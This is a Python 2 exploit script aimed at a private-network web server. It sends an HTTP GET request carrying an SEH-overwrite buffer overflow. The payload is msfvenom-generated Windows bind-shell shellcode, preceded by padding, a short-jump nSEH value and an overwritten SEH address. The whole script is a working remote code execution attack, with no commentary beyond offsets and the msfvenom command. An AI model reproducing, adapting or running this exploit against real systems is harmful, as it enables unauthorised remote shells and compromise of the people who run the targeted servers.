#!/usr/bin/python

import sys
import socket
import struct

host = "192.168.214.135"
port = 80
total_buffer = 5005
nseh_offset = 4061
seh_offset = 4065
jump_offset = 16-4 # 0x10 ; jump value - 2 bytes of DEC ESP, 2 bytes of JA SHORT
crash_template = (
    "GET {} HTTP/1.0\r\n\r\n"
)

# msfvenom -p windows/shell_bind_tcp -a x86 --platform windows EXITFUNC=seh BufferRegister=EDI -b '\x00\x0a\x0d\x2e\x20\x25\x2b\x2f\x5c' -f python

buf =  ""
buf += "\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xb1\xdb\x38\x39\x83\xee\xfc\xe2\xf4\x4d\x33"
buf += "\xba\x39\xb1\xdb\x58\xb0\x54\xea\xf8\x5d\x3a\x8b\x08"
buf += "\xb2\xe3\xd7\xb3\x6b\xa5\x50\x4a\x11\xbe\x6c\x72\x1f"
buf += "\x80\x24\x94\x05\xd0\xa7\x3a\x15\x91\x1a\xf7\x34\xb0"
buf += "\x1c\xda\xcb\xe3\x8c\xb3\x6b\xa1\x50\x72\x05\x3a\x97"
buf += "\x29\x41\x52\x93\x39\xe8\xe0\x50\x61\x19\xb0\x08\xb3"
buf += "\x70\xa9\x38\x02\x70\x3a\xef\xb3\x38\x67\xea\xc7\x95"
buf += "\x70\x14\x35\x38\x76\xe3\xd8\x4c\x47\xd8\x45\xc1\x8a"
buf += "\xa6\x1c\x4c\x55\x83\xb3\x61\x95\xda\xeb\x5f\x3a\xd7"
buf += "\x73\xb2\xe9\xc7\x39\xea\x3a\xdf\xb3\x38\x61\x52\x7c"
buf += "\x1d\x95\x80\x63\x58\xe8\x81\x69\xc6\x51\x84\x67\x63"
buf += "\x3a\xc9\xd3\xb4\xec\xb3\x0b\x0b\xb1\xdb\x50\x4e\xc2"
buf += "\xe9\x67\x6d\xd9\x97\x4f\x1f\xb6\x24\xed\x81\x21\xda"
buf += "\x38\x39\x98\x1f\x6c\x69\xd9\xf2\xb8\x52\xb1\x24\xed"
buf += "\x53\xb9\x82\x68\xdb\x4c\x9b\x68\x79\xe1\xb3\xd2\x36"
buf += "\x6e\x3b\xc7\xec\x26\xb3\x3a\x39\xa0\x87\xb1\xdf\xdb"
buf += "\xcb\x6e\x6e\xd9\x19\xe3\x0e\xd6\x24\xed\x6e\xd9\x6c"
buf += "\xd1\x01\x4e\x24\xed\x6e\xd9\xaf\xd4\x02\x50\x24\xed"
buf += "\x6e\x26\xb3\x4d\x57\xfc\xba\xc7\xec\xd9\xb8\x55\x5d"
buf += "\xb1\x52\xdb\x6e\xe6\x8c\x09\xcf\xdb\xc9\x61\x6f\x53"
buf += "\x26\x5e\xfe\xf5\xff\x04\x38\xb0\x56\x7c\x1d\xa1\x1d"
buf += "\x38\x7d\xe5\x8b\x6e\x6f\xe7\x9d\x6e\x77\xe7\x8d\x6b"
buf += "\x6f\xd9\xa2\xf4\x06\x37\x24\xed\xb0\x51\x95\x6e\x7f"
buf += "\x4e\xeb\x50\x31\x36\xc6\x58\xc6\x64\x60\xc6\x37\x83"
buf += "\x31\x50\x9f\x24\x66\xa5\xc6\x64\xe7\x3e\x45\xbb\x5b"
buf += "\xc3\xd9\xc4\xde\x83\x7e\xa2\xa9\x57\x53\xb1\x88\xc7"
buf += "\xec"


nseh = "\x71\x0A\x71\x0A"
#nseh = "\x41" * 4
seh = struct.pack("<L",0x100103fe)
junk1 = "\x41" * nseh_offset
shell_code = ("\x41" * 50) + buf
junk2 = "\x41" * (total_buffer - nseh_offset - len(nseh) - len(seh) - len(shell_code))
junk = junk1 + nseh + seh + shell_code + junk2

payload = junk
crash_send = crash_template.format(payload)

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM for TCP
        s.connect((host, port))
        # s.recv(500)
        s.send(crash_send)
        s.close()
except:
        print "socket() failed"
        sys.exit(1)

print len(payload)
print len(junk2)
print len(junk)